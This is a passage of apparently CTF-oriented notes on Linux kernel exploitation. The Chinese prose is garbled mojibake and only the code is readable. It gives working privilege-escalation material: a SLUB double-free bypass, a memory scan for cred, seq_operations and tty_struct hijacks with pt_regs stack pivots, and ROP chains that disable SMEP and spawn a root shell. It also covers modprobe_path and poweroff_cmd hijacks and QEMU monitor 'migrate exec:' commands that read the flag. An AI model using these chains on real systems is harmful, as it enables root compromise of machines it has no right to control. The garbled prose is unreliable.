freeptr_addr);\n}\n```\n\næ£€æµ‹double_freeï¼Œå…¶å®å°±ç›¸å½“äºæ˜¯fastbinä¸­çš„double_freeæ£€æµ‹ï¼Œæ£€æµ‹freelistä¸­çš„ç¬¬ä¸€ä¸ªå’Œå³å°†æ”¾è¿›å…¥freelistä¸­çš„chunkæ˜¯å¦ç›¸ç­‰ã€‚\n\n![image-20220308235157003](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203082351317.png)\n\næ‰€ä»¥åŒç†å¯å¾—ï¼Œä¹Ÿå¯ä»¥è¯´å¦‚ä¸‹ï¼Œåœ¨ä¸­é—´åŠ å…¥ä¸€ä¸ªchunkçš„freeå³å¯ç»•è¿‡\n\n```\nfree chunk1\nfree chunk2\nfree chunk1\n```\n\nä½†æ˜¯åœ¨å†…æ ¸ç¯å¢ƒä¸‹ï¼Œå•¥æ—¶å€™éƒ½å¯èƒ½ç¢°åˆ°ç”³è¯·chunkï¼Œæ‰€ä»¥æœ‰æ—¶å€™å¯èƒ½å†ç”³è¯·çš„æ—¶å€™ä¸èƒ½æˆåŠŸç”³è¯·åˆ°chunk1->chunk2->chunk1çš„é¡ºåº\n\nè¿™æ—¶å€™å¦‚æœæœ€å¥½è¿˜æ˜¯ç»‘å®šåˆ°ä¸€ä¸ªCPUä¸Š\n\n```c\n// ç»‘å®šåˆ°ä¸€ä¸ªcpuä¸Š\nunsigned char cpu_mask = 0x01;\nsched_setaffinity(0, 1, &cpu_mask);\n```\n\n\n\n#### (3)RANDOMä¿æŠ¤\n\nåœ¨v4.7åŠä¹‹åå­˜åœ¨ï¼Œç¼–è¯‘å†…æ ¸æ—¶åŠ å…¥`CONFIG_SLAB_FREELIST_RANDOM=y`é€‰é¡¹ï¼Œä¼šå¯ç”¨`Fisher-Yates`éšæœºæ’åˆ—ç®—æ³•æ‰“ä¹±freelistçš„é¡ºåº\n\nè¿™ä¸ªæƒ…å†µä¸‹æ¯æ¬¡æ›´æ–°freelistçš„æ—¶å€™ï¼Œä¼šæ‰“ä¹±freelistä¸­ç©ºé—²çš„chunkï¼Œé€ æˆæ— æ³•ç®€å•ç”³è¯·åˆ°æŒ‡å®šçš„chunkï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥ä¿®æ”¹FDä¹‹åï¼Œå¤šæ¬¡ç”³è¯·ï¼Œä¹Ÿå¯ä»¥ç”³è¯·åˆ°ä¿®æ”¹ä¹‹åçš„chunkã€‚\n\nä¹Ÿæ˜¯å‚è€ƒ[Slub Freelist Hardened (rtfingc.github.io)](https://rtfingc.github.io/slub-freelist-hardened)\n\n### å€ŸåŠ©prctlå‡½æ•°å¯»æ‰¾credåœ°å€\n\nğŸ”ºæ³¨ï¼šéœ€è¦å­˜åœ¨ä»»æ„è¯»\n\nprctlå‡½æ•°çš„PR_SET_NAMEåŠŸèƒ½å¯ä»¥è®¾ç½®task_structç»“æ„ä½“ä¸­çš„comm[TASK_COMM_LEN]æˆå‘˜ã€‚\n\n```c\nchar target[16];\nstrcpy(target,\"tryToFindPIG007\");\nprctl(PR_SET_NAME,target);\n```\n\nç„¶åå†…å­˜æœç´¢å®šä½\n\n```c\n//search target chr\nchar *buf = (char *)calloc(1,0x1000);\nputs(\"[+] we can read and write any memory\");\nfor(;addr<0xffffc80000000000;addr+=0x1000){\n    arbitrary_read(devFD,0x1000,buf,addr);\n    result=memmem(buf,0x1000,target,16);\n    if (result){\n        printf(\"result:%p\\n\",result);\n        cred= * (size_t *)(result-0x8);\n        real_cred= *(size_t *)(result-0x10);\n        if ((cred||0xff00000000000000) && (real_cred == cred))\n        {\n            target_addr=addr+result-(int)(buf);\n            printf(\"[+]found task_struct 0x%lx\\n\",target_addr);\n            printf(\"[+]found cred 0x%lx\\n\",real_cred);\n            break;\n        }\n    }\n}\n```\n\nä¹‹åå†å€Ÿç”¨ä»»æ„å†™æˆ–è€…ä¿®æ”¹FDç”³è¯·æ¥ä¿®æ”¹credç»“æ„ä¸­çš„å†…å®¹å³å¯ã€‚\n\n\n\n\n\n### å€ŸåŠ©statè®¾å¤‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ\n\nåŸç†å°±æ˜¯åŠ«æŒ`seq_operations`ç»“æ„ä½“çš„å‡½æ•°æŒ‡é’ˆï¼Œè¿›è€Œæ§åˆ¶ç¨‹åºæµã€‚\n\nè¥¿æ¹–è®ºå‰‘--easy_kernel\n\n[è¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ›easykernelé¢˜è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/260055#h3-5)\n\næœ‰å¦‚ä¸‹ç»“æ„ä½“ï¼Œå¤§å°ä¸º0x20ï¼Œå½“æˆ‘ä»¬å¯ä»¥ç”³è¯·0x20å¤§å°çš„Chunkï¼Œç„¶åé‡Šæ”¾ï¼Œå†æ‰“å¼€`/proc/self/stat`è®¾å¤‡å°±å¯ä»¥å¾—åˆ°è¯¥ç»“æ„ä½“ã€‚\n\n```\nstruct seq_operations {\n    void * (*start) (struct seq_file *m, loff_t *pos);\n    void (*stop) (struct seq_file *m, void *v);\n    void * (*next) (struct seq_file *m, void *v, loff_t *pos);\n    int (*show) (struct seq_file *m, void *v);\n};\n```\n\nå¦‚æœå­˜åœ¨UAFä¹‹ç±»çš„å°±å¯ä»¥ä»é‡Œé¢è¯»å–å‡½æ•°åç§»ï¼Œè·å¾—kernelåŸºåœ°å€ï¼Œç„¶åè¿˜å¯ä»¥ä¿®æ”¹é‡Œé¢çš„startå‡½æ•°æŒ‡é’ˆï¼ŒåŠ«æŒä½¿å…¶æŒ‡å‘æˆ‘ä»¬çš„gadgetï¼Œå½“æˆ‘ä»¬å¯¹è¯¥è®¾å¤‡è¿›è¡Œè¯»å–æ“ä½œæ—¶ï¼Œå°±ä¼šè°ƒç”¨è¯¥startæŒ‡é’ˆï¼Œä»è€Œè¿›å…¥åˆ°æˆ‘ä»¬åŠ«æŒçš„gadgetï¼Œè¿›è€Œå¯ä»¥ç¨‹åºæ§åˆ¶æ‰§è¡Œæµã€‚ä½¿ç”¨å¦‚ä¸‹æ±‡ç¼–è¿›è¡Œå¯¹è¯¥è®¾å¤‡çš„æ“ä½œã€‚\n\n```c\n\"xor rax, rax;\"\n\"mov rcx, 0x666666;\"\n\"mov rdx, 8;\"\n\"mov rsi, rsp;\"\n\"mov rdi, seq_fd;\"\n\"syscall\"\n```\n\nåŠ«æŒä¹‹åå†éœ€è¦getshellå°±éœ€è¦æ³¨æ„å¦ä¸€ä¸ªç»“æ„ä½“äº†\n\n```c\nstruct pt_regs {\n/*\n * C ABI says these regs are callee-preserved. They aren't saved on kernel entry\n * unless syscall needs a complete, fully filled \"struct pt_regs\".\n */\n    unsigned long r15;\n    unsigned long r14;\n    unsigned long r13;\n    unsigned long r12;\n    unsigned long rbp;\n    unsigned long rbx;\n/* These regs are callee-clobbered. Always saved on kernel entry. */\n    unsigned long r11;\n    unsigned long r10;\n    unsigned long r9;\n    unsigned long r8;\n    unsigned long rax;\n    unsigned long rcx;\n    unsigned long rdx;\n    unsigned long rsi;\n    unsigned long rdi;\n/*\n * On syscall entry, this is syscall#. On CPU exception, this is error code.\n * On hw interrupt, it's IRQ number:\n */\n    unsigned long orig_rax;\n/* Return frame for iretq */\n    unsigned long rip;\n    unsigned long cs;\n    unsigned long eflags;\n    unsigned long rsp;\n    unsigned long ss;\n/* top of stack page */\n};\n```\n\nå½“æˆ‘ä»¬è°ƒç”¨syscallçš„æ—¶å€™ï¼Œä¼šå°†ä»¥ä¸Šå¯„å­˜å™¨å‹å…¥å†…æ ¸æ ˆä¸­ï¼Œç„¶åå½¢æˆå¦‚ä¸Šçš„ç»“æ„ï¼Œå³å¦‚ä¸‹æ±‡ç¼–æ‰€ç¤º\n\n```c\n__asm__(\n    \"mov r15, 0xbeefdead;\"\n    \"mov r14, pop_rdi_ret;\"\n    \"mov r13, init_cred;\" // add rsp, 0x40 ; ret\n    \"mov r12, commit_creds;\"\n    \"mov rbp, swapgs_restore_regs_and_return_to_usermode;\"\n    \"mov rbx, 0x1111;\"\n    \"mov r11, 0x1111;\"\n    \"mov r10, 0x400db8;\"\n    \"mov r9, user_cs;\"\n    \"mov r8, user_rflags;\"\n    \"xor rax, rax;\"\n    \"mov rcx, user_sp;\"\n    \"mov rdx, user_ss;\"\n    \"mov rsi, rsp;\"\n    \"mov rdi, seq_fd;\"\n    \"syscall\"\n);\n```\n\nå¦‚ä¸Šçš„æ±‡ç¼–ä¼šåœ¨å†…æ ¸æ ˆä¸­å½¢æˆå¦‚ä¸‹\n\n![image-20220115110535050](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151105563.png)\n\næ‰€ä»¥å¦‚æœå€ŸåŠ©`add_rsp xx;pop_ret`è¿™ç±»æŒ‡ä»¤ï¼Œå°±å¯ä»¥å°†æˆ‘ä»¬çš„æ§åˆ¶æµçš„æ ˆæ‹‰é«˜åˆ°æˆ‘ä»¬å¯æ§æ•°æ®èŒƒå›´ï¼Œè¿›è€ŒåŠ«æŒæ ˆã€‚ä½¿ç”¨`commit(cred)`ææƒï¼ˆè¿™é‡Œçš„ææƒå› ä¸ºæ— æ³•æ§åˆ¶rdiï¼Œæ‰€ä»¥å°±å€ŸåŠ©`init_cred`æ¥ææƒï¼‰ã€‚ææƒä¹‹åå€ŸåŠ©`swapgs_restore_regs_and_return_to_usermode`å‡½æ•°ä¸­çš„popç³»åˆ—æ¥è°ƒæ•´æ ˆï¼Œå³å€Ÿç”¨äº†å‡ ä¸ªæ ˆçš„ä½ç½®ï¼Œå°±å¾—å°‘å‡ ä¸ªpopï¼Œå¦‚å›¾å€Ÿç”¨äº†5ä¸ªæ ˆæ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ€åå°±å¾—ä½¿å¾—è¯¥å‡½æ•°å°‘pop5ä¸ªï¼Œå³å°†swapgs_restore_regs_and_return_to_usermodeå‡½æ•°çš„gadget+=9å³å¯\n\n```c\nswapgs_restore_regs_and_return_to_usermode += 9;\n```\n\n![image-20220115113005162](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151130591.png)\n\nå¦‚ä¸Šä¿®æ”¹ä¹‹åå°±å¯ä»¥å½“è¿›å…¥åˆ°è¯¥å‡½æ•°çš„swapgsçš„æ—¶å€™ï¼Œå°†æ ˆè°ƒæ•´è‡³æœ€å¼€å§‹å› ä¸ºsyscallè€Œå½¢æˆçš„ä¿å­˜pt_regsç»“æ„ä½“ä¸­çš„ç”¨æˆ·æ€æ•°æ®çš„åœ°æ–¹ï¼Œä½¿å¾—ææƒä¹‹åæˆåŠŸè¿”å›ç”¨æˆ·æ€\n\n```c\nstruct pt_regs {\n//.....................\n/* Return frame for iretq */\n    unsigned long rip;\n    unsigned long cs;\n    unsigned long eflags;\n    unsigned long rsp;\n    unsigned long ss;\n/* top of stack page */\n};\n```\n\næ‰€ç¤ºæ ˆå¦‚ä¸‹\n\n![image-20220115113622350](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151136862.png)\n\nä½¿ç”¨æ­¤ç§æ–¹æ³•æ—¶ä¸€èˆ¬å¯ä»¥å…ˆè®¾ç½®ä¸€äº›æ ‡å¿—æ€§æ•°æ®ï¼Œâ€œAAAAAAâ€åœ¨æ ˆä¸Šï¼Œç„¶åæœå¯»å³å¯ï¼Œä»¥æ­¤æ¥å¯»æ‰¾è°ƒæ ˆæ‰€ç”¨çš„gadgetã€‚\n\n```c\n__asm__(\n    \"mov r15, 0xbeefdead;\"\n    \"mov r14, pop_rdi_ret;\"\n    \"mov r13, init_cred;\" // add rsp, 0x40 ; ret\n    \"mov r12, commit_creds;\"\n    \"mov rbp, swapgs_restore_regs_and_return_to_usermode;\"\n    \"mov rbx, 0x6565656565;\"\n    \"mov r11, 0x1111;\"\n    \"mov r10, 0x1111;\"\n    \"mov r9, 0x1111;\"\n    \"mov r8, 0x1111;\"\n    \"xor rax, rax;\"\n    \"mov rcx, 0x1111;\"\n    \"mov rdx, 8;\"\n    \"mov rsi, rsp;\"\n    \"mov rdi, seq_fd;\"\n    \"syscall\"\n);\n```\n\nç„¶ååœ¨æŸä¸ªåœ°å€èŒƒå›´è¿›è¡Œæœç´¢ï¼Œå°±èƒ½æ‰¾åˆ°è¯¥ç»“æ„ä½“çš„ä½ç½®ï¼Œå¥½åƒåªèƒ½æ˜¯pedaæ¯”è¾ƒå¥½ç”¨\n\n```\nfind \"AAAAAA\" 0xffffc900001d3f80 0xffffc900001d3f98\n```\n\n### å€ŸåŠ©ptmxè®¾å¤‡(tty_struct)\n\n```\nentry_SYSCALL_64`->`SyS_write`->`SYSC_write`->`vfs_write`\n->`__vfs_write`->`tty_write`->`do_tty_write`->`n_tty_write`->`pty_write`\n```\n\nåŸç†å°±æ˜¯åŠ«æŒ`tty_struct`ç»“æ„ä½“ä¸­çš„`const struct tty_operations *ops`ç»“æ„ä½“æŒ‡é’ˆï¼Œç„¶åå†ä¿®æ”¹`fake_tty_operations`ç»“æ„ä½“ä¸­çš„`pty_write`å‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡å¯¹è¯¥è®¾å¤‡è¿›è¡Œå†™æ“ä½œè¿›è€Œè°ƒç”¨åŠ«æŒçš„å‡½æ•°æŒ‡é’ˆï¼Œæ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚\n\nåŒæ—¶åœ¨è°ƒç”¨çš„æ—¶å€™raxä¸ºä»åŠ«æŒçš„tty_structç»“æ„ä½“ä¸­è·å–çš„`operations *ops`æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆå¯ä»¥è¢«æˆ‘ä»¬ä¿®æ”¹åŠ«æŒã€‚ä¹‹åå€ŸåŠ©ä¸€ä¸ªå¯¹raxå’Œrspè¿›è¡Œæ“ä½œçš„`gadget--movRspRax_decEbx_ret`è¿›è€ŒåŠ«æŒæ ˆï¼Œå®Œæˆç¨‹åºæµå’Œæ ˆçš„åŠ«æŒã€‚\n\n```c\n/* function to get root id */\nvoid getroot (void)\n{\n  commit_creds(prepare_kernel_cred(0));\n}\n\nvoid shell(void) {\n  printf(\"[+] getuid() ...\");\n  if(!getuid()) {\n    printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n    system(\"/bin/sh\");\n  } else {\n    printf(\"[+] not root\\n[+] failed !!!\\n\");\n  }\n}\nunsigned long getR = (unsigned long)getroot;\nunsigned long sh = (unsigned long)shell;\nsize_t rop[32];\n\n\nvoid* fake_tty_operations[30];\nfor(int i = 0; i < 30; i++)\n{\nfake_tty_operations[i] = movRspRax_decEbx_ret;\n}\nfake_tty_operations[0] = pop_rax_rbx_r12_r13_rbp_ret;\nfake_tty_operations[1] = (size_t)rop;\n\n\nsize_t fake_tty_struct[4] = {0};\nfake_tty_struct[0] = 0x0000000100005401;//need to set magic number\nfake_tty_struct[1] = 0;\nfake_tty_struct[2] = 0;\nfake_tty_struct[3] = (size_t)fake_tty_operations;\n\n\nrop[i++] = pop_rdi_ret;      // pop_rax_rbx_r12_rbp_ret\nrop[i++] = 0x6f0;\nrop[i++] = movCr4Rdi_pop_rbp_ret;      // mov cr4, rax; pop rbp; ret;\nrop[i++] = 0;\nrop[i++] = (size_t)getR;\nrop[i++] = swapgs_popRbp_ret;      // swapgs;ret\nrop[i++] = 0x0;\nrop[i++] = iretq;      // iretq\nrop[i++] = (size_t)sh;\nrop[i++] = user_cs;                /* saved CS */\nrop[i++] = user_rflags;            /* saved EFLAGS */\nrop[i++] = user_sp;\nrop[i++] = user_ss;\n```\n\n\n\n## 2.æ ˆ\n\n### (1)commit_creds(prepare_kernel_cred(0));\n\nè¿™ä¸ªç®—æ˜¯æ¯”è¾ƒå¸¸è§„çš„æ ˆæº¢å‡ºï¼Œä¸è¿‡è¿˜éœ€è¦æ³¨æ„SMEP/SMAPä»¥åŠKPTIæ˜¯å¦å¼€å¯\n\n#### â‘ å¼€å¯SMEPæƒ…å†µ\n\nè¿™ç§æƒ…å†µä¸€èˆ¬ç›´æ¥æº¢å‡ºç„¶åå…³é—­ï¼Œæˆ–è€…çŸ¥é“åŸºåœ°å€ä¹‹åå¯ä»¥å°è¯•åœ¨å†…æ ¸å®Œæˆææƒç„¶åè¿”å›ç”¨æˆ·æ€\n\n##### ROPå…³é—­SMEPä¿æŠ¤ï¼Œæ‰§è¡Œç”¨æˆ·æ€ææƒä»£ç \n\n```c\n/* function to get root id */\nvoid getroot (void)\n{\n  commit_creds(prepare_kernel_cred(0));\n}\n\nvoid shell(void) {\n  printf(\"[+] getuid() ...\");\n  if(!getuid()) {\n    printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n    system(\"/bin/sh\");\n  } else {\n    printf(\"[+] not root\\n[+] failed !!!\\n\");\n  }\n}\nunsigned long getR = (unsigned long)getroot;\nunsigned long sh = (unsigned long)shell;\nsize_t rop[32];\n\nrop[i++] = pop_rdi_ret;      // \nrop[i++] = 0x6f0;\nrop[i++] = movCr4Rdi_pop_rbp_ret;  // mov cr4, rax; pop rbp; ret;\nrop[i++] = 0;\nrop[i++] = (size_t)getR;\nrop[i++] = swapgs_popRbp_ret; \nrop[i++] = 0x0;\nrop[i++] = iretq;      \t\t\t// iretq\nrop[i++] = (size_t)sh;\nrop[i++] = user_cs;                /* saved CS */\nrop[i++] = user_rflags;            /* saved EFLAGS */\nrop[i++] = user_sp;\nrop[i++] = user_ss;\n```\n\n##### ROPåœ¨å†…æ ¸æ€ææƒåè¿”å›ç”¨æˆ·æ€èµ·Shell\n\n```c\nvoid shell(void) {\n  printf(\"[+] getuid() ...\");\n  if(!getuid()) {\n    printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n    system(\"/bin/sh\");\n  } else {\n    printf(\"[+] not root\\n[+] failed !!!\\n\");\n  }\n}\nunsigned long sh = (unsigned long)shell;\nsize_t rop[32];\n\nrop[i++] = pop_rdi_ret;      \nrop[i++] = 0x0;\nrop[i++] = prepare_kernel_cred_k;  \nrop[i++] = pop_rdx_rbx_rbp_ret;\nrop[i++] = pop_rbp_ret;\nrop[i++] = 0x0;      \nrop[i++] = 0xdeadbeef;\nrop[i++] = movRdiRax_call_rdx; \nrop[i++] = commit_creds_k;\nrop[i++] = swapgs_ret;              \nrop[i++] = iretq;            /* saved EFLAGS */\nrop[i++] = (size_t)sh;\nrop[i++] = user_cs;                /* saved CS */\nrop[i++] = user_rflags;            /* saved EFLAGS */\nrop[i++] = user_sp;\nrop[i++] = user_ss;\n```\n\n#### â‘¡æœªå¼€å¯SMEPæƒ…å†µ\n\nç›´æ¥è°ƒç”¨ç”¨æˆ·ç©ºé—´çš„ææƒä»£ç ï¼Œè¿”å›ä¹‹åèµ·shellå³å¯\n\n```c\n/* function to get root id */\nvoid getroot (void)\n{\n  commit_creds(prepare_kernel_cred(0));\n}\n\nvoid shell(void) {\n  printf(\"[+] getuid() ...\");\n  if(!getuid()) {\n    printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n    system(\"/bin/sh\");\n  } else {\n    printf(\"[+] not root\\n[+] failed !!!\\n\");\n  }\n}\nunsigned long getR = (unsigned long)getroot;\nunsigned long sh = (unsigned long)shell;\nsize_t rop[32];\n\nrop[i++] = (size_t)getR;\nrop[i++] = swapgs_popRbp_ret; \nrop[i++] = 0x0;\nrop[i++] = iretq;      // iretq\nrop[i++] = (size_t)sh;\nrop[i++] = user_cs;                /* saved CS */\nrop[i++] = user_rflags;            /* saved EFLAGS */\nrop[i++] = user_sp;\nrop[i++] = user_ss;\n```\n\n(2)\n\n\n\n## 3.mmapå†…å­˜æ˜ å°„\n\nè¿˜æ²¡çœ‹å¤ªæ‡‚ï¼Œæ¶‰åŠæ–‡ä»¶ç³»ç»Ÿå’Œé©±åŠ¨çš„å†…å­˜æ˜ å°„\n\nå¯ä»¥å‚è€ƒ`LINECTF-2022-ecrypt`ï¼Œåé¢æœ‰æåˆ°å€ŸåŠ©kern_tableæ•°ç»„æ¥åˆ©ç”¨\n\n\n\n## 4.å¸¸è§ææƒæ‰‹æ®µ\n\n### ä¿®æ”¹modprobe_path\n\nè¿™ä¸ªè®¾æ–¹æ³•å¦‚æœå¼€å¯å¦‚ä¸‹é…ç½®åˆ™ä¸å¯ç”¨ï¼Œè¡¨ç¤º`modprobe_path`ä¸ºåªè¯»ï¼Œä¸å¯ä¿®æ”¹\n\n```\n//v4.11åŠä¹‹åå­˜åœ¨\nCONFIG_STATIC_USERMODEHELPER=y\nCONFIG_STATIC_USERMODEHELPER_PATH=\"\"\n```\n\nå¸¸å¸¸ç»“åˆUAFæ¼æ´æ¥ä»»æ„ç”³è¯·\n\nstarctf2019-hackme--[starctf2019-hackme | PIG-007](https://pig-007.github.io/2021/08/14/starctf2019-hackme/)\n\nè¥¿æ¹–è®ºå‰‘--easy_kernel--[2021 è¥¿æ¹–è®ºå‰‘ çº¿ä¸Šåˆèµ› WP â€“ Crispr â€“çƒ­çˆ±æŠ€æœ¯å’Œç”Ÿæ´» (crisprx.top)](https://www.crisprx.top/archives/495)\n\n```\ncat /proc/kallsyms| grep modprobe_path\n```\n\nå¦‚æœæ²¡æœ‰çš„è¯ï¼Œå¯ä»¥å…ˆçœ‹å€ŸåŠ©`kallsyms`æ¥`__request_module`å‡½æ•°çš„åœ°å€ï¼Œç„¶åæŸ¥çœ‹è¯¥å‡½æ•°çš„æ±‡ç¼–ï¼Œè·å–`modprobe_path`çš„å¼•ç”¨\n\n![image-20220328144717290](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281447847.png)\n\nç„¶ååˆ¶ä½œä¸€ä¸ªæ‹·è´flagå¹¶ä¸”æ”¹æƒé™çš„copy.shæ–‡ä»¶ï¼Œä½¿å¾—modprobe_pathæŒ‡å‘è¯¥æ–‡ä»¶ï¼Œç„¶åè¿è¡Œä¸€ä¸ªé”™è¯¯æ ¼å¼çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå‡ºé”™ä¹‹åå°±ä¼šä»¥rootæƒé™è¿è¡Œmodprobe_pathï¼Œä»è€Œä»¥rootæƒé™è¿è¡Œæˆ‘ä»¬çš„copy.shï¼Œä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿè¯»å–flagäº†ã€‚\n\n```c\nstrncpy(mem,\"/home/pwn/copy.sh\\0\",18);\nwrite_to_kernel(fd,0xc,mem,18,0);\n\nsystem(\"echo -ne '#!/bin/sh\\n/bin/cp /flag /home/pwn/flag\\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh\");\nsystem(\"chmod +x /home/pwn/copy.sh\");\nsystem(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /home/pwn/dummy\");\nsystem(\"chmod +x /home/pwn/dummy\");\n\nsystem(\"/home/pwn/dummy\");\nsystem(\"cat flag\");\n```\n\n### ä¿®æ”¹init_cred\n\ninitè¿›ç¨‹æ˜¯åˆå§‹è¿›ç¨‹ï¼Œä¸è¢«åŠ¨æ€åˆ†é…ï¼ŒçŸ¥é“kernelåŸºåœ°å€çš„æ—¶å€™ï¼Œå°±èƒ½å¾—åˆ°è¯¥ç»“æ„ä½“çš„åœ°å€ã€‚\n\n```bash\ncat /proc/kallsyms |grep init_cred\n```\n\nè¿™ç§æ–¹æ³•ä¸€èˆ¬ç”¨åœ¨æ²¡åŠæ³•ä¿®æ”¹åˆ°æœ¬è¿›ç¨‹çš„credç»“æ„ä½“çš„æ—¶å€™ï¼Œä¹‹åä½¿ç”¨å³å¯ææƒ\n\n```c\n//pop_rdi_ret init_cred_addr commit_creds_addrå³å¯\ncommit_creds(&init_cred)\n```\n\n### åŠ«æŒprtcl_hook\n\n[pwnKernelä»0å¼€å§‹(å››) | PIG-007](http://localhost:4000/2021/10/19/Kernelä»0å¼€å§‹(å››)/#3-åŠ«æŒprctlå‡½æ•°)\n\n```\nprctl->security_task_prctl->prctl_hook->orderly_poweroff->__orderly_poweroff->run_cmd(poweroff_cmd)-> call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)\n\nprctl->security_task_prctl->prctl_hook->poweroff_work_fun->run_cmd(poweroff_cmd)-> call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)\n```\n\n#### (1)åŠ«æŒä¸ºorderly_poweroffå‡½æ•°\n\nåŠ«æŒè¯¥hookä¸ºorderly_poweroffå‡½æ•°ï¼Œç„¶åè°ƒç”¨prctlå‡½æ•°å³å¯æ“çºµç¨‹åºæµè¿›å…¥`orderly_poweroff`å‡½æ•°ï¼Œå†åŠ«æŒ`poweroff_cmd`å³å¯é¡ºç€`orderly_poweroff`å‡½æ•°æ¥è¿è¡Œ`call_usermodehelper(poweroff_cmd)`ï¼Œè¯¥å‡½æ•°æ˜¯ä»¥rootæƒé™è¿è¡Œï¼Œæ‰€ä»¥èƒ½å¤Ÿç›´æ¥ææƒï¼Œä¸è¿‡ä¸€èˆ¬è¿è¡Œä¸€ä¸ªåå¼¹shellçš„ç¨‹åºã€‚å½“ç„¶å¦‚æœæœ‰KASLRå°±è¦çˆ†ç ´æˆ–è€…æ³„éœ²äº†ã€‚\n\næœ€åéœ€è¦æ‰§è¡Œ`prctl(0,0)`ï¼›\n\n#### (2)åŠ«æŒä¸ºpoweroff_work_funå‡½æ•°\n\nä¸åŠ«æŒ`orderly_poweroff`å‡½æ•°åŒç†ï¼ŒåŠ«æŒä¸º`poweroff_work_fun`å‡½æ•°ä¹Ÿå¯ä»¥ä»¥rootæƒé™æ‰§è¡Œ`poweroff_cmd`\n\n\n\n#### (3)è·å–åœ°å€\n\n##### â‘ prctl_hook\n\nå¯ä»¥é€šè¿‡ç¼–å†™ä¸€ä¸ªå°ç¨‹åºï¼Œç„¶åç»™`security_task_prctl`å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œåˆ°`call QWORD PTR[rbx+0x18]`å³å¯çœ‹åˆ°å¯¹åº”çš„rbx+0x18ä¸Šå­˜æ”¾çš„åœ°å€ï¼Œå³å¯è·å–åˆ°`prct_hook_addr`ï¼ŒåŠ«æŒä¿®æ”¹å³å¯\n\n##### â‘¡poweroff_cmdã€orderly_poweroffã€poweroff_work_fun\n\npoweroff_cmdæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå¯ä»¥ç›´æ¥è·å–åœ°å€ç„¶åä¿®æ”¹ã€‚å¯ä»¥ç›´æ¥ä½¿ç”¨nmå‘½ä»¤æ¥è·å–ï¼Œæˆ–è€…ç›´æ¥è¿›å…¥gdbæ‰“å°å³å¯ã€‚\n\n![image-20211021105456058](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247187.png)\n\næ­¤å¤–orderly_poweroffä¹Ÿæ˜¯ä¸€æ ·çš„è·å–ã€‚å¦‚æœæ— æ³•æŸ¥åˆ°ï¼Œé‚£ä¹ˆå¯ä»¥å¯åŠ¨qemuï¼Œå…ˆè®¾ç½®ä¸ºrootæƒé™å\n\n`cat /proc/kallsyms | grep \"orderly_poweroff\"`å³å¯ï¼Œæˆ–è€…ç¼–è¯‘ä¸€ä¸ªå¯¹åº”ç‰ˆæœ¬çš„å†…æ ¸è¿›è¡ŒæŸ¥è¯¢ã€‚\n\n![image-20211021105603666](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247302.png)\n\n`poweroff_work_fun`å‡½æ•°ä¹Ÿæ˜¯ç±»ä¼¼çš„è·å–æ–¹å¼\n\n\n\n\n\n# ä¸ƒã€æ„æƒ³ä¸åˆ°çš„æ–¹å¼\n\n## 1.QEMUé€ƒé€¸\n\nå½“æ²¡æœ‰å…³é—­monitoræ—¶ï¼Œå¯ä»¥ç›´æ¥ctrl+A Cè¿›å»é€ƒé€¸ï¼Œè§£å‹rootfs.imgè¯»flag\n\n```bash\nmigrate \"exec:cp rootfs.img /tmp \"\nmigrate \"exec:cd /tmp;zcat rootfs.img | cpio -idmv 1>&2\"\nmigrate \"exec:cat /tmp/flag 1>&2\"\n(qemu) migrate \"exec:cat /tmp/flag 1>&2\"\nflag{test_flag}qemu-system-x86_64: failed to save SaveStateEntry with id(name):)\nqemu-system-x86_64: Unable to write to command: Broken pipe\nqemu-system-x86_64: Unable to write to command: Broken pipe\n\n\nzcat rootfs.cpio | cpio -idmv 1>&2\n```\n\n## 2.æƒé™åŠç›¸å…³é…ç½®é—®é¢˜\n\næœ‰çš„æ ¹ç›®å½•æˆ–è€…binç›®å½•çš„æ‰€æœ‰è€…ä¸æ˜¯rootæ—¶\n\n### (1)binç›®å½•ä¸ä¸ºROOT\n\n![image-20220302114830086](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021148186.png)\n\nè¿™æ ·å¯ä»¥ä¿®æ”¹biné‡Œé¢çš„å‘½ä»¤ï¼Œè€Œinitè„šæœ¬åœ¨é€€å‡ºæ—¶ï¼Œé€šå¸¸åŒ…å«poweroffå‘½ä»¤ï¼Œæˆ–è€…umountå‘½ä»¤ï¼Œè€Œinitè¿è¡Œæ—¶æ˜¯ä»¥rootæƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹è¿™äº›å‘½ä»¤ä»è€Œåœ¨è¾“å…¥exitå‘½ä»¤è°ƒç”¨initä¸­åœ¨setsidå‰©ä¸‹çš„å‘½ä»¤æ—¶æ¥ç›´æ¥cat flagæˆ–è€…è·å¾—shell\n\n![image-20220302114945940](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021149995.png)\n\n### (2)æ ¹ç›®å½•ä¸ä¸ºROOT\n\n![image-20220302115207278](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021152377.png)\n\né‚£ä¹ˆåœ¨æ 